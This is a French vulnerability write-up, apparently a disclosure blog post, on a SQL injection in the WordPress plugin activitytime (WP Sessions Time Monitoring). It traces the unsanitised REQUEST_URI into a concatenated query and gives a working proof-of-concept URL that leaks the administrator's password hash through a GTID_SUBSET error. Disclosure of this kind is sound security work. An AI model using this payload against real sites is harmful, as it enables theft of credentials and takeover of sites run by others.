---
title: "Injection SQL dans le plugin Wordpress WP Sessions Time Monitoring Full Automatic"
tags: [vulnérabilité]
---

## Présentation du plugin

Le plugin [WP Sessions Time Monitoring Full Automatic](https://wpscan.com/plugin/activitytime) (ou `activitytime` pour être plus court) a la description suivante :

> Plugin will track accurate activity time on specific page, very useful for cases like content reading time, stream or video watching time,
tracking time in LMS online learning system, working time for writing or editing elementor templates, pages editing time, post editing time and similar.
>
> Build as extension of WinterLock functionality for Accurate Sessions Time Tracking
> Features:
> 
> User time spent duration per page  
> Tracking activity time  
> Tracking working time  
> Tracking editing time  
> Tracking writing time  
> Tracking visit time  
> Tracking time on page  
> Tracking reading time  
> Tracking user time  
> Tracking elementor working time  
> Accurate session time tracking  

Ce plugin est en version 1.0.8 et la dernière activité date d'il y a 1 mois au moment de ces lignes.

## La vulnérabilité

Dans le fichier `activitytime/activitytime.php` quelques lignes permettent de déclencher l'utilisation du plugin :

```php
function run_activitytime() {

    $plugin = new Activitytime();
    $plugin->run();

}
run_activitytime();
```

Cette classe `Activitytime` est déclarée dans le fichier `activitytime/includes/class-activitytime.php`.

En voici un extrait :

```php
/**
 * The core plugin class.
 *
 * This is used to define internationalization, admin-specific hooks, and
 * public-facing site hooks.
 *
 * Also maintains the unique identifier of this plugin as well as the current
 * version of the plugin.
 *
 * @since      1.0.0
 * @package    Activitytime
 * @subpackage Activitytime/includes
 * @author     SWIT <sandi@swit.hr>
 */
class Activitytime {
  // snip 
  public function __construct() {
    if ( defined( 'ACTIVITYTIME_VERSION' ) ) {
        $this->version = ACTIVITYTIME_VERSION;
    } else {
        $this->version = '1.0.0';
    }
    $this->plugin_name = 'activitytime';

    $this->load_dependencies();
    $this->set_locale();
    $this->define_admin_hooks();
    $this->define_public_hooks();

    $this->define_plugins_upgrade_hooks();
    $this->define_shortcode_hooks();
    $this->define_widget_hooks();
    $this->define_logging_hooks();
  }
```

C'est le dernier appel effectué dans le constructeur qui nous intéresse. Là plusieurs hooks sont mis en place :

```php
/**
 * Defining all action and filter hooks for logging
 */
public function define_logging_hooks() {

    $logging_hooks = new Activitytime_Tracker( $this->get_plugin_name(), $this->get_version() );

    $this->loader->add_action( 'wp_loaded', $logging_hooks, 'activity_wp_loaded' );

    $this->loader->add_action( 'wp_head', $logging_hooks, 'init' );
    $this->loader->add_action( 'admin_head', $logging_hooks, 'init' );

    $this->loader->add_action( 'wp_head', $this, 'activitytime_tracker' );
    $this->loader->add_action( 'admin_head', $this, 'activitytime_tracker' );


    add_action( 'rest_api_init', function() {
        register_rest_route( 'activitytime/v1', '/action', [
        'methods'  => 'POST',
        'callback' => [ $this, 'activitytime_action' ],
        ] );
    } );
}
```

La classe `Activitytime_Tracker` est déclarée dans `activitytime/includes/class-activitytime-tracker.php`.

Dès lors qu'elle est instanciée, elle fait appel à la fonction `activity_log_request` de cette même classe :

```php
/**
 * hooked into 'init' action hook
 */
public function init()
{
    $this->activity_log_request();
}
```

Voici le passage vulnérable qui se charge de stocker en base de données les requêtes sur le Wordpress :

```php
// visit log
if(strpos($insert_array['request_uri'], 'ajax') === FALSE &&
   strpos($insert_array['request_uri'], 'json') === FALSE &&
   strpos($insert_array['request_uri'], 'cron') === FALSE &&
   strpos($insert_array['request_uri'], 'actt') === FALSE &&
   strpos($insert_array['request_uri'], 'activitytime') === FALSE &&
   count($_POST) == 0)
{
    $query = 'SELECT * FROM '.$table_name.' WHERE request_uri = \''.actt_get_uri().'\'';

    if(!empty(get_current_user_id()))
    {
        $query .= ' AND user_id='.get_current_user_id();
    }
    else
    {
        $query .= ' AND ip=\''.actt_get_the_user_ip().'\'';
    }

    $query .= ' AND is_visit_end = 0';

    $check_exists = $wpdb->get_row($query);

    if(empty($check_exists))
    {
        $wpdb->insert( $table_name, $insert_array );
        $id = $wpdb->insert_id;
    }
}
```

L'injection se fait au niveau du paramètre `request_uri` via la valeur retournée par `actt_get_uri`.

Cette fonction définie dans `activitytime/includes/helper-functions.php` est la suivante :

```php
function actt_get_uri($skip_query_string = FALSE)
{
    $filename = $_SERVER['REQUEST_URI'];

    $ipos = strpos($filename, "?");
    if ( !($ipos === false) && $skip_query_string === TRUE)   $filename = substr($filename, 0, $ipos);
    return urldecode($filename);
}
```

On voit que le code PHP ne fait qu'extraire la query string depuis l'URL (tout ce qui se trouve après le caractère `?`) sans aucune vérification.

Le PoC suivant permet d'extraire le hash de l'administrateur :

```php
http://localhost:8000/?p=1%27%20AND%20GTID_SUBSET%28CONCAT%280x686173683a%2C%28SELECT%20MID%28%28IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%29%2C1%2C190%29%20FROM%20%60wordpress%60.wp_users%20ORDER%20BY%20ID%20LIMIT%201%2C1%29%29%2C3124%29--%20a
```

Cela va provoquer la requête SQL suivante :

```sql
SELECT * FROM wp_actt_visited_pages WHERE
request_uri = '/?p=1' AND GTID_SUBSET(CONCAT(0x686173683a,(SELECT MID((IFNULL(CAST(user_pass AS NCHAR),0x20)),1,190) FROM `wordpress`.wp_users ORDER BY ID LIMIT 1,1)),3124)-- a'
AND ip='172.19.0.1' AND is_visit_end = 0
```

L'utilisation de la fonction MySQL [GTID_SUBSET](https://dev.mysql.com/doc/refman/8.0/en/gtid-functions.html#function_gtid-subset) permet l'exfiltration du hash via une erreur Wordpress :

```
WordPress database error: [Malformed GTID set specification 'hash:$P$BLGng0fIZc6vbUELsDJDRKpYO9Jb/e0'.]
```
